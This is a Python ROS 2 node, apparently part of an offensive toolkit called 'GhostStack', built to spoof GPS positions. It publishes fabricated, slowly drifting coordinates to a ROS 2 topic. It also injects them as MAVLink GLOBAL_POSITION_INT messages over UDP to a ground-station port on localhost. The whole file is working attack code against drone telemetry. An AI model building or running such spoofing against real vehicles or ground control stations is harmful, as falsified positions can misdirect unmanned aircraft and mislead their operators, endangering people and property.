import rclpy
from rclpy.node import Node
from sensor_msgs.msg import NavSatFix
from pymavlink import mavutil
import time
import threading

# GhostStack: Network Layer - MAVLink/ROS 2 Spoofing Node
#
# This node performs two tasks:
# 1. Publishes spoofed GPS coordinates to the ROS 2 ecosystem.
# 2. Injects these same spoofed coordinates into a MAVLink stream 
#    via GLOBAL_POSITION_INT messages.

class SpoofingNode(Node):
    def __init__(self):
        super().__init__('ghoststack_spoofer')
        self.publisher_ = self.create_publisher(NavSatFix, '/ghoststack/spoofed_gps', 10)
        self.timer = self.create_timer(1.0, self.timer_callback)
        
        # MAVLink Setup (UDP out to GCS or Drone)
        self.mav_conn = mavutil.mavlink_connection('udpout:127.0.0.1:14550')
        
        self.lat = 37.7749  # Start Lat
        self.lon = -122.4194 # Start Lon
        self.alt = 100000   # 100m in mm
        
        self.get_logger().info('[*] GhostStack Spoofing Node Initialized')
        self.get_logger().info('[*] Target: MAVLink UDP 127.0.0.1:14550 & ROS 2 /ghoststack/spoofed_gps')

    def timer_callback(self):
        # Slightly drift coordinates to simulate movement
        self.lat += 0.0001
        self.lon += 0.0001
        
        # 1. Publish to ROS 2
        msg = NavSatFix()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.header.frame_id = 'gps_link'
        msg.latitude = self.lat
        msg.longitude = self.lon
        msg.altitude = self.alt / 1000.0
        self.publisher_.publish(msg)
        
        # 2. Inject into MAVLink
        # Msg: GLOBAL_POSITION_INT ( #33 )
        self.mav_conn.mav.global_position_int_send(
            int(time.time() * 1000), # boot_time
            int(self.lat * 1e7),      # lat (deg * 1e7)
            int(self.lon * 1e7),      # lon (deg * 1e7)
            self.alt,                 # alt (mm)
            self.alt,                 # relative_alt (mm)
            0, 0, 0,                  # vx, vy, vz
            0                         # hdg (cdeg)
        )
        
        self.get_logger().info(f'[!] Spoofed Pos: {self.lat:.5f}, {self.lon:.5f}')

def main(args=None):
    rclpy.init(args=args)
    node = SpoofingNode()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
